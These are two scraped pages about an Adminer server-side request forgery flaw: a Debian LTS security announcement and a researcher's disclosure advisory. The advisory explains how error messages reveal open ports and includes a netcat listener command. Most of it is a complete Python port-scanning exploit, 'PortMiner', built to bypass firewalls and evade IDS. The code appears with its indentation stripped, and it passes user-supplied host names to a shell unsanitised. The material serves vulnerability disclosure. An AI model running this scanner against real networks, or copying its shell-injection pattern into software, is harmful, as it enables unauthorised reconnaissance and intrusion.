=== Content from lists.debian.org_e900966d_20250124_121712.html ===


---

[[Date Prev](msg00013.html)][[Date Next](msg00015.html)]
[[Thread Prev](msg00013.html)][[Thread Next](msg00015.html)]
[[Date Index](maillist.html#00014)]
[[Thread Index](threads.html#00014)]

# [SECURITY] [DLA 1311-1] adminer security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 1311-1] adminer security update
* *From*: Chris Lamb <lamby@debian.org>
* *Date*: Thu, 22 Mar 2018 15:11:37 +0000
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/1521731497.2097185.1312411888.3E22B617%40webmail.messagingengine.com)Â [1521731497.2097185.1312411888.3E22B617@webmail.messagingengine.com](msg00014.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Package        : adminer
Version        : 3.3.3-1+deb7u1
CVE ID         : CVE-2018-7667
Debian Bug     : #893668

It was discovered that there was a server-side request forgery exploit in
adminer, a web-based database administration tool.

Adminer allowed unauthenticated connections to be initiated to arbitrary
systems and ports which could bypass external firewalls to identify
internal hosts or perform port scanning of other servers.

For Debian 7 "Wheezy", this issue has been fixed in adminer version
3.3.3-1+deb7u1.

We recommend that you upgrade your adminer packages.

Regards,

- --
      ,''`.
     : :'  :     Chris Lamb
     `. `'`      lamby@debian.org / chris-lamb.co.uk
       `-

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEwv5L0nHBObhsUz5GHpU+J9QxHlgFAlqzx4IACgkQHpU+J9Qx
Hlgqhg/+KfM5/8OKDv99f0F7zH9PCExw86Q+939oeoyvNTsewmtOsFpv45XuZElg
uCth0XBX/mU+uUvC7/1a1ixpthaHfTWnlJ5Wmjg7ytmdtOY0RyzxYV+UPvxFNdTp
ECKeoGqHIbVvyiEnVGEi+L+tuPP9L4ZrKr1sMMC4W4gwSG2bJTif72w7GNXKoXYz
qiqz1Sf8FU4zdllppcuk/ifokiBE3KZ+mxvkzg4L7nzRYNEOTWG9y36+9WIBNB3u
MJ5qZUaEUC9whgcYtLsskCc16vBdsSekA5v71HUYxFKrwHA0b/DpDtawmbUOE5s0
xpTgTjNbFo/sv1yDXIj2I7JNTJFISgGe7P5asRyvJY6vWzQuCj7xCAcCIcCjVYOf
T2coa14qEdAYPYK7YwufVzWog4f+DDMs8YxDAtSiWoDA5eqk1/zaXP3qQB5NZpOt
zjxJ1PUBEgH7S3kF7xL3cnS3xHv0RjCYor4OZrQ/Sq2t1eBI8c5LgqcLZnov2zuh
kd19TOUpaSAEIO8Sdb7njM9KI0/m56wIKycJ9IvAUDBQIgmYH1Ly25GUQ00dHvdQ
9TMOeYPgtHS1iifI2FRuKnKrolcxJGdKZXPWrogqL7Mp3SnpXGpBHgGQGQvkh4TP
c6EUDNrzwGIGYUPK4Gs/jz1lYG5V3PUZKFs7A3Ecafo8eTPrbB4=
=X8Gg
-----END PGP SIGNATURE-----

```

---



=== Content from hyp3rlinx.altervista.org_1daaab87_20250124_121712.html ===
[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/ADMINER-UNAUTHENTICATED-SERVER-SIDE-REQUEST-FORGERY.txt
[+] ISR: apparition security
Vendor:
==============
www.adminer.org
Product:
================
Adminer <= v4.3.1
Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a
single file ready to deploy to the target server. Adminer is available for MySQL, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.
https://github.com/vrana/adminer/releases/
Vulnerability Type:
===================
Server Side Request Forgery
CVE Reference:
==============
N/A
Security Issue:
================
Adminer allows unauthenticated connections to be initiated to arbitrary systems/ports. This vulnerability can be used to potentially bypass firewalls to
identify internal hosts and perform port scanning of other servers for reconnaissance purposes. Funny thing is Adminer throttles invalid login attempts
but allows endless unauthorized HTTP connections to other systems as long as your not trying to authenticate to Adminer itself.
Situations where Adminer can talk to a server that we are not allowed to (ACL) and where we can talk to the server hosting Adminer, it can do recon for us.
Recently in LAN I was firewalled off from a server, however another server running Adminer I can talk to. Also, that Adminer server can talk to the target.
Since Adminer suffers from Server-Side Request Forgery, I can scan for open ports and gather information from that firewalled off protected server.
This allowed me to not only bypass the ACL but also hide from the threat detection system (IDS) monitoring east west connections.
However, sysadmins who check the logs on the server hosting Adminer application will see our port scans.
root@lamp log/apache2# cat other\_vhosts\_access.log
localhost:12322 ATTACKER-IP - - [2/Jan/2018:14:25:11 +0000] "GET ///?server=TARGET-IP:21&username= HTTP/1.1" 403 1429 "-" "-"
localhost:12322 ATTACKER-IP - - [2/Jan/2018:14:26:24 +0000] "GET ///?server=TARGET-IP:22&username= HTTP/1.1" 403 6019 "-" "-"
localhost:12322 ATTACKER-IP - - [2/Jan/2018:14:26:56 +0000] "GET ///?server=TARGET-IP:23&username= HTTP/1.1" 403 6021 "-" "-"
Details:
==================
By comparing different failed error responses from Adminer when making SSRF bogus connections, I figured out which ports are open/closed.
Port open ==> Lost connection to MySQL server at 'reading initial communication packet
Port open ==> MySQL server has gone away
Port open ==> Bad file descriptor
Port closed ==> Can't connect to MySQL server on '';
Port closed ==> No connection could be made because the target machine actively refused it
Port closed ==> A connection attempt failed.
This worked so well for me I wrote a quick port scanner 'PortMiner' as a proof of concept that leverages Adminer SSRF vulnerability.
PortMiner observations:
======================
No response 'read operation timed out' means the port is possibly open or filtered and should be given a closer look if possible. This seems to occur when scanning
Web server ports like 80, 443. However, when we get error responses like the ones above from the server we can be fairly certain a port is either open/closed.
Quick POC:
echo -e 'HTTP/1.1 200 OK\r\n\r\n' | nc -l -p 5555
Use range 5555-5555
Exploit/POC:
=============
import socket,re,ssl,warnings,subprocess,time
from platform import system as system\_name
from os import system as system\_call
#Adminer Server Side Request Forgery
#PortMiner Scanner Tool
#by John Page (hyp3rlinx)
#ISR: ApparitionSec
#hyp3rlinx.altervista.org
#=========================
#D1rty0Tis says hi.
#timeout
MAX\_TIME=32
#ports to log
port\_lst=[]
#Web server response often times out but usually means ports open.
false\_pos\_ports=['80','443']
BANNER='''
\_\_\_\_ \_ \_\_ \_\_ \_
| \_ \ | | | \/ (\_)
| |\_\_) |\_\_ \_ \_\_| |\_| \ / |\_ \_ \_\_ \_\_\_ \_ \_\_
| \_\_\_/ \_ \| '\_\_| \_\_| |\/| | | '\_ \ / \_ \ '\_\_|
| | | (\_) | | | |\_| | | | | | | | \_\_/ |
|\_| \\_\_\_/|\_| \\_\_|\_| |\_|\_|\_| |\_|\\_\_\_|\_|
'''
def info():
print "\nPortMiner depends on Error messages to determine open/closed ports."
print "Read operations reported 'timed out' may be open/filtered.\n"
def greet():
print 'Adminer Unauthenticated SSRF Port Scanner Tool'
print 'Targets Adminer used for MySQL administration\n'
print 'by hyp3rlinx - apparition security'
print '-----------------------------------------------------\n'
print 'Scan small ranges or single ports or expect to wait.\n'
print 'Do not scan networks without authorized permission.'
print 'Author not responsible for abuse/misuse.\n'
def chk\_ports(p):
p=p.replace('-',',')
port\_arg=p.split(',')
try:
if len(port\_arg)>1:
if int(port\_arg[1]) < int(port\_arg[0]):
print 'Port range not valid.'
raw\_input()
return
if int(port\_arg[1])>65535:
print 'Exceeded max Port range 65535.'
raw\_input()
return
except Exception as e:
print str(e)
return None
return list(range(int(port\_arg[0]),int(port\_arg[1])+1))
def log(IP):
try:
file=open('PortMiner.txt', 'w')
file.write(IP+'\n')
for p in port\_lst:
file.write(p+'\n')
file.close()
except Exception as e:
print str(e)
print "\nSee PortMiner.txt"
def use\_ssl(ADMINER,ADMINER\_PORT):
try:
s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.connect((ADMINER,int(ADMINER\_PORT)))
s=ssl.wrap\_socket(s, keyfile=None, certfile=None, server\_side=False, cert\_reqs=ssl.CERT\_NONE, ssl\_version=ssl.PROTOCOL\_SSLv23)
s.close()
except Exception as e:
print ""
return False
return True
def version(ip,port,uri,use\_ssl):
res=""
try:
s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.connect((ip,int(port)))
if use\_ssl:
s=ssl.wrap\_socket(s, keyfile=None, certfile=None, server\_side=False, cert\_reqs=ssl.CERT\_NONE, ssl\_version=ssl.PROTOCOL\_SSLv23)
s.send('GET '+'/'+uri+'/?server='+':'+'&username=\r\n\r\n')
except Exception as e:
print 'Host up but cant connect.' #str(e)
print 'Re-check Host/Port/URI.'
s.close()
return 504
while True:
RES=s.recv(512)
if RES.find('Forbidden')!=-1:
print 'Forbidden 403'
s.close()
return None
if RES.find('401 Authorization Required')!=-1:
print '401 Authorization Required'
s.close()
return None
ver = re.findall(r'(.\*)',RES,re.DOTALL|re.MULTILINE)
if not RES:
s.close()
return None
if ver:
print 'Your Adminer '+ ver[0] + ' works for us now.'
s.close()
return ver
s.close()
return None
def scan(ADMINER,ADMINER\_PORT,ADMINER\_URI,TARGET,PORTS\_TO\_SCAN,PRINT\_CLOSED,USE\_SSL):
global MAX\_TIME,port\_range
RES=''
print 'scanning ports: %s ' % str(port\_range[0])+'to ' + str(port\_range[-1])+' ...'
for aPort in port\_range:
aPort=str(aPort)
try:
s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.settimeout(MAX\_TIME)
s.connect((ADMINER,ADMINER\_PORT))
if USE\_SSL:
s=ssl.wrap\_socket(s, keyfile=None, certfile=None, server\_side=False, cert\_reqs=ssl.CERT\_NONE, ssl\_version=ssl.PROTOCOL\_SSLv23)
s.send('GET /'+ADMINER\_URI+'/?server='+TARGET+':'+aPort+'&username= HTTP/1.1\r\nHost: '+TARGET+'\r\n\r\n')
except Exception as e:
print str(e)
s.close()
return
while True:
try:
RES=s.recv(512)
###print RES
###Should see HTTP/1.1 403 not 200
if RES.find('HTTP/1.1 200 OK')!=-1:
print 'port '+aPort + ' open'
port\_lst.append(aPort+' open')
s.close()
break
if RES.find('400 Bad Request')!=-1:
print '400 Bad Request, check params'
s.close()
break
raw\_input()
lst=re.findall(r"([^\n].\*connect to MySQL server on.\*[^\n])|(Lost connection to MySQL server at.\*)|(MySQL server has gone away.\*)"+
"|(No connection could be made because the target machine actively refused it.\*)|(A connection attempt failed.\*)|(HTTP/1.1 200 OK.\*)", RES)
if lst:
status=str(lst)
if status.find('connect to MySQL')!=-1:
if PRINT\_CLOSED:
print 'port '+ aPort + ' closed'
s.close()
break
elif status.find('machine actively refused it.')!=-1:
if PRINT\_CLOSED:
print 'port '+ aPort + ' closed'
s.close()
break
elif status.find('A connection attempt failed')!=-1:
if PRINT\_CLOSED:
print 'port '+ aPort + ' closed'
s.close()
break
elif status.find('reading initial communication packet')!=-1:
print 'port '+aPort + ' open'
port\_lst.append(aPort+' open')
s.close()
break
elif status.find('MySQL server has gone away')!=-1:
print 'port '+aPort + ' open'
port\_lst.append(aPort+' open')
s.close()
break
elif status.find('Bad file descriptor')!=-1:
print 'port '+aPort + ' open'
port\_lst.append(aPort+' open')
s.close()
break
elif status.find('Got packets out of order')!=-1:
print 'port '+aPort + ' open'
s.close()
break
except Exception as e:
msg = str(e)
###print msg
if msg.find('timed out')!=-1 and aPort in false\_pos\_ports:
print 'port '+aPort + ' open'
port\_lst.append(aPort+' open')
s.close()
break
elif msg.find('timed out')!=-1:
print 'port '+aPort + ' timed out'
port\_lst.append(aPort+' read operation timed out')
s.close()
break
else:
s.close()
break
if port\_lst:
log(TARGET)
else:
print "Scan completed, no ports mined."
return 0
def arp(host):
args = "-a" if system\_name().lower()=="windows" else "-e"
return subprocess.call("arp " + args + " " + host, shell=True) == 0
def ping\_host(host):
args = "-n 1" if system\_name().lower()=="windows" else "-c 1"
res=subprocess.call("ping " + args + " " + host, shell=True) == 0
if not res:
print str(host) + ' down? trying ARP'
if not arp(host):
print str(host) + ' unreachable.'
return
return res
def main():
global port\_range
print BANNER
greet()
ADMINER\_VERSION=False
PRINT\_CLOSED=False
USE\_SSL=None
ADMINER=raw\_input('[+] Adminer Host/IP> ')
if ADMINER=='':
print 'Enter valid Host/IP'
ADMINER=raw\_input('[+] Adminer Host/IP> ')
ADMINER\_PORT=raw\_input('[+] Adminer Port> ')
if not re.search("^\d{1,5}$",ADMINER\_PORT):
print 'Enter a valid Port.'
ADMINER\_PORT=raw\_input('[+] Adminer Port> ')
ADMINER\_URI=raw\_input('[+] Adminer URI [the adminer-.php OR adminer/ dir path] > ')
TARGET=raw\_input('[+] Host/IP to Scan> ')
PORTS\_TO\_SCAN=raw\_input('[+] Port Range e.g. 21-25> ').replace(' ','')
plst=re.findall(r"(\d{1,5})-(\d{1,5})",PORTS\_TO\_SCAN)
if not plst:
print 'Invalid ports, format is 1-1025'
return
raw\_input() #console up
port\_range=chk\_ports(PORTS\_TO\_SCAN)
if not port\_range:
return
PRINT\_CLOSED=raw\_input('[+] Print closed ports? 1=Yes any key for No> ')
if PRINT\_CLOSED=='1':
PRINT\_CLOSED=True
else:
PRINT\_CLOSED=False
if not ping\_host(ADMINER):
print 'host %s not reachable or blocking ping ' % ADMINER
cont=raw\_input('Continue with scan? 1=Yes any key for No> ')
if cont!='1':
print 'Scan aborted.'
raw\_input() #console up
return
USE\_SSL=use\_ssl(ADMINER,ADMINER\_PORT)
time.sleep(2)
ADMINER\_VERSION = version(ADMINER,ADMINER\_PORT,ADMINER\_URI,USE\_SSL)
if not ADMINER\_VERSION:
print "Can't retrieve Adminer script. check supplied URI."
raw\_input() #console up
return
else:
if ADMINER\_VERSION==504:
raw\_input() #console up
return
if scan(ADMINER,int(ADMINER\_PORT),ADMINER\_URI,TARGET,PORTS\_TO\_SCAN,PRINT\_CLOSED,USE\_SSL)==0:
more=raw\_input('Info: 1=Yes, any key for No> ')
if more=='1':
info()
raw\_input() #console up
if \_\_name\_\_=='\_\_main\_\_':
main()
Network Access:
===============
Remote
Severity:
=========
Medium
Disclosure Timeline:
=============================
Vendor Notification: December 16, 2017
Vendor Acknowledgment and reply "I could disallow connecting to well-known ports" : December 18, 2017
Vendor "Adminer throttles invalid login attempts. That should help. I am not sure what else could Adminer do about this."
No more replies from vendor since : December 18, 2017
Attempt contact vendor : January 4, 2018
No more replies (unresponsive).
January 12, 2018 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx
